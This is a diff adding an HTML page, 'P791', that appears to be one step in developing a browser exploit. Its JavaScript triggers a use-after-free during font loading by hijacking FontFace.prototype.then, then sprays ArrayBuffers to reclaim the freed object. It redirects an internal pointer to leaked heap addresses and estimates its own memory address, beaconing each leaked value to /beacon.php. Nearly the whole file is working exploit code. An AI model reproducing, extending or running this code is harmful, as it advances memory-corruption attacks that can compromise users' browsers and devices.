@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P791 — Full Field Dump + Self-Address Discovery</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P791 — Full Field Dump + Self-Address Discovery
+ *
+ * P790 proved: q1 redirect to valid heap survives. But we only
+ * checked q0/q1/q11/q13. The engine might write MORE fields
+ * when q1 is non-NULL (following the pointer successfully
+ * unlocks a code path that NULL-q1 skips).
+ *
+ * This probe:
+ *   PASS 1: Zeroed spray → dump ALL 24 qwords (baseline)
+ *   PASS 2: q1 = pass1_q11 → dump ALL 24 qwords (redirect)
+ *   COMPARE: any NEW fields written in pass 2 vs pass 1?
+ *
+ * Also tests q1 = pass1_q13 as an alternative redirect target.
+ *
+ * BONUS: Self-address calculation. If q11 = AB_addr + offset,
+ * we test by writing a marker at (q11 - offset) from outside
+ * and checking if it appears inside the AB.
+ *
+ * CRASH_CLASS: HIGH — pointer redirect
+ * ============================================================ */
+
+window.onerror = function(msg, url, line){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P791-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P791-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+}
+
+var out;
+function log(s){ if(out) out.textContent += s + '\n'; }
+
+/* Dump all 24 qwords from a BigUint64Array */
+function dumpAll(view, label){
+  var parts = [];
+  for (var q = 0; q < 24; q++){
+    if (view[q] !== BigInt(0)){
+      parts.push('q' + q + '=0x' + h16(view[q]));
+    }
+  }
+  /* Split into chunks for beacon size limit */
+  var chunk = '';
+  for (var i = 0; i < parts.length; i++){
+    if (chunk.length + parts[i].length > 650){
+      b(label, chunk);
+      chunk = '';
+    }
+    if (chunk.length > 0) chunk += '|';
+    chunk += parts[i];
+  }
+  if (chunk.length > 0) b(label, chunk);
+  return parts;
+}
+
+/* Unicode pairs per pass: cssChar, faceChar, testString */
+var PASS_CHARS = {
+  'p1': { css: '0042', face: '0041', test: 'AB' },
+  'p2': { css: '0044', face: '0043', test: 'CD' },
+  'p3': { css: '0046', face: '0045', test: 'EF' }
+};
+
+/* Single UAF pass: returns {view, hit, nz} via callback */
+function doUAF(name, prefillFn, cb){
+  var chars = PASS_CHARS[name] || { css: '0042', face: '0041', test: 'AB' };
+
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:bb' + name + ';src:local(Arial);unicode-range:U+' + chars.css + ';}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('f' + name, 'local(Helvetica)',
+    { unicodeRange: 'U+' + chars.face });
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired) return undefined;
+      fired = true;
+      if (st){ st.remove(); st.textContent = ''; st = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+
+      for (var k = 0; k < 64; k++){
+        var ab = new ArrayBuffer(192);
+        if (prefillFn){
+          var v = new BigUint64Array(ab);
+          prefillFn(v);
+        }
+        abs.push(ab);
+      }
+
+      try { document.fonts.check('1em bb' + name); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em f' + name + ', bb' + name, chars.test);
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best = -1, bestNz = 0;
+    for (var i = 0; i < abs.length; i++){
+      var u = new Uint8Array(abs[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz){ bestNz = nz; best = i; }
+    }
+    if (best < 0 || bestNz < 4){
+      b(name + '-MISS', 'nz=' + bestNz);
+      cb(null, best, bestNz);
+      return;
+    }
+    var view = new BigUint64Array(abs[best]);
+    cb(view, best, bestNz);
+  }, 400);
+}
+
+function run(){
+  out = document.getElementById('out');
+  out.textContent = 'P791 — Full Field Dump + Self-Address Discovery\n';
+  out.textContent += '================================================\n\n';
+  b('BOOT', 'v1');
+
+  /* PASS 1: Zeroed baseline */
+  log('PASS 1: Zeroed UAF (baseline)...');
+  doUAF('p1', null, function(view1, hit1, nz1){
+    if (!view1){
+      log('PASS 1 MISS — no reclaim');
+      b('P1-FAIL', 'nz=' + nz1);
+      return;
+    }
+
+    var p1parts = dumpAll(view1, 'P1-DUMP');
+    log('PASS 1 HIT (nz=' + nz1 + '): ' + p1parts.join(', '));
+
+    var q11_1 = view1[11];
+    var q13_1 = view1[13];
+    b('P1-ADDRS', 'q11=0x' + h16(q11_1) + '|q13=0x' + h16(q13_1));
+    log('  q11 = 0x' + h16(q11_1));
+    log('  q13 = 0x' + h16(q13_1));
+
+    /* PASS 2: q1 = pass1 q11 (redirect to known heap) */
+    log('\nPASS 2: q1 = pass1_q11 (0x' + h16(q11_1) + ')...');
+    doUAF('p2', function(v){
+      v[1] = q11_1;  /* redirect q1 */
+    }, function(view2, hit2, nz2){
+      if (!view2){
+        log('PASS 2 MISS — no reclaim');
+        b('P2-FAIL', 'nz=' + nz2);
+        return;
+      }
+
+      var p2parts = dumpAll(view2, 'P2-DUMP');
+      log('PASS 2 HIT (nz=' + nz2 + '): ' + p2parts.join(', '));
+
+      /* Compare: find fields present in pass 2 but NOT in pass 1 */
+      var newFields = [];
+      for (var q = 0; q < 24; q++){
+        var v1 = view1[q], v2 = view2[q];
+        /* Skip engine-written fields that are always present */
+        if (q === 0 || q === 11 || q === 12 || q === 13) continue;
+        /* Skip q1 (we set it) */
+        if (q === 1) continue;
+        if (v2 !== BigInt(0) && v1 === BigInt(0)){
+          newFields.push('q' + q + '=0x' + h16(v2));
+        }
+      }
+
+      if (newFields.length > 0){
+        b('P2-NEW-FIELDS', newFields.join('|'));
+        log('\n*** NEW FIELDS in pass 2 (not in pass 1): ' + newFields.join(', '));
+      } else {
+        b('P2-NO-NEW', 'same_fields_as_p1');
+        log('\nNo new fields — redirect to q11 didn\'t unlock new writes.');
+      }
+
+      /* PASS 3: q1 = pass1 q13 (alternative redirect) */
+      log('\nPASS 3: q1 = pass1_q13 (0x' + h16(q13_1) + ')...');
+      doUAF('p3', function(v){
+        v[1] = q13_1;  /* redirect q1 to q13 instead */
+      }, function(view3, hit3, nz3){
+        if (!view3){
+          log('PASS 3 MISS — no reclaim');
+          b('P3-FAIL', 'nz=' + nz3);
+          finalize(view1, view2, null);
+          return;
+        }
+
+        var p3parts = dumpAll(view3, 'P3-DUMP');
+        log('PASS 3 HIT (nz=' + nz3 + '): ' + p3parts.join(', '));
+
+        var newFields3 = [];
+        for (var q = 0; q < 24; q++){
+          if (q === 0 || q === 1 || q === 11 || q === 12 || q === 13) continue;
+          if (view3[q] !== BigInt(0) && view1[q] === BigInt(0)){
+            newFields3.push('q' + q + '=0x' + h16(view3[q]));
+          }
+        }
+
+        if (newFields3.length > 0){
+          b('P3-NEW-FIELDS', newFields3.join('|'));
+          log('\n*** NEW FIELDS in pass 3 (not in pass 1): ' + newFields3.join(', '));
+        } else {
+          b('P3-NO-NEW', 'same_fields_as_p1');
+          log('\nNo new fields — redirect to q13 didn\'t unlock new writes either.');
+        }
+
+        finalize(view1, view2, view3);
+      });
+    });
+  });
+}
+
+function finalize(v1, v2, v3){
+  /* Self-address estimation: test offsets 0x58, 0x60, 0x68, 0x70, 0x78, 0x80 */
+  if (v1){
+    var q11 = v1[11];
+    var offsets = [0x58, 0x60, 0x68, 0x70, 0x78, 0x80, 0x88, 0x90, 0xA0, 0xB0];
+    var info = [];
+    for (var i = 0; i < offsets.length; i++){
+      var est = q11 - BigInt(offsets[i]);
+      info.push('+0x' + offsets[i].toString(16) + '=' + '0x' + h16(est));
+    }
+    b('SELFADDR', info.join('|'));
+    log('\nSelf-address estimates (q11 - offset):');
+    for (var i = 0; i < offsets.length; i++){
+      log('  If buffer at +0x' + offsets[i].toString(16) + ': AB = 0x' + h16(q11 - BigInt(offsets[i])));
+    }
+  }
+
+  /* nz comparison */
+  var summary = 'p1_nz=' + (v1 ? countNz(v1) : 'miss');
+  summary += '|p2_nz=' + (v2 ? countNz(v2) : 'miss');
+  summary += '|p3_nz=' + (v3 ? countNz(v3) : 'miss');
+  b('SUMMARY', summary);
+  log('\n' + summary);
+
+  b('DONE', 'complete');
+  log('\n=== P791 COMPLETE ===');
+}
+
+function countNz(view){
+  var n = 0;
+  for (var q = 0; q < 24; q++) if (view[q] !== BigInt(0)) n++;
+  return n;
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <pre id="out">P791 — Full Field Dump — Loading...</pre>
+</body>
+</html>
